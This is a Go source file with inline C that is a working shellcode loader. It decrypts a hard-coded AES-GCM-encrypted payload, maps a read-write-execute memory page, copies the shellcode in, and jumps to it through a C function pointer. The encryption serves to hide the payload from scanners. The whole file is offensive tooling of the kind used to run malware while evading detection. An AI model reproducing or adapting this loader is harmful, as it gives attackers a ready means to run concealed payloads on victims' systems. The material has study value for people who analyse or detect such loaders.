package main

/*
#include <stdio.h>
void call(char *code){
	int(*ret)() = (int(*)())code;
	ret();
}

*/
import "C"
import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/hex"
	"fmt"
	"syscall"
	"unsafe"
)

const EncryptedShellcode = string("\x66\x63\x34\x61\x32\x32\x30\x32\x38\x62\x63\x63\x34\x64\x37\x66\x65\x61\x33\x64\x37\x36\x65\x63\x64\x61\x65\x61\x61\x32\x38\x36\x35\x38\x31\x33\x64\x62\x30\x35\x61\x64\x66\x35\x34\x37\x33\x66\x38\x36\x30\x34\x63\x34\x65\x62\x65\x37\x36\x34\x66\x36\x66\x38\x66\x37\x32\x35\x32\x34\x66\x64\x61\x34\x33\x36\x30\x65\x38\x34\x32\x61\x30\x65\x62\x30\x62\x62\x36\x66\x37\x32\x65\x65\x34\x39")
const EncryptionKey = "some32bitlong passphraseimusing "
const Nonce = string("\x65\x63\x63\x31\x33\x31\x35\x35\x36\x64\x30\x66\x31\x61\x36\x62\x35\x31\x34\x33\x32\x62\x62\x39")

func main() {
	// Decrypt shellcode:
	decryptedShellcode := Decrypt()

	fmt.Print("Allocating executable memory page...")
	page, err := syscall.Mmap(-1, 0, syscall.Getpagesize(), syscall.PROT_READ|syscall.PROT_WRITE|syscall.PROT_EXEC, syscall.MAP_ANONYMOUS|syscall.MAP_PRIVATE)
	if err != nil {
		panic("MMAP failed")
	}
	fmt.Println("Done")

	fmt.Print("Copying decoded shellcode to page...")
	copy(page, decryptedShellcode)
	fmt.Println("Done")

	fmt.Println("Executing shellcode")
	C.call((*C.char)(unsafe.Pointer(&page[0]))) // Handover to C for RIP manipulation

}

func Decrypt() []byte {
	fmt.Print("Decoding Shellcode...")
	cipherText, _ := hex.DecodeString(EncryptedShellcode)
	nonce, _ := hex.DecodeString(Nonce)

	block, _ := aes.NewCipher([]byte(EncryptionKey)) //Encryption Key = 32 bit ===> This create a AES 256 cipher for us to use
	aesgcm, _ := cipher.NewGCM(block)                //Cipher created and ready to use

	decrypted, _ := aesgcm.Open(nil, nonce, cipherText, nil)

	fmt.Printf("Done\n")
	return decrypted
}
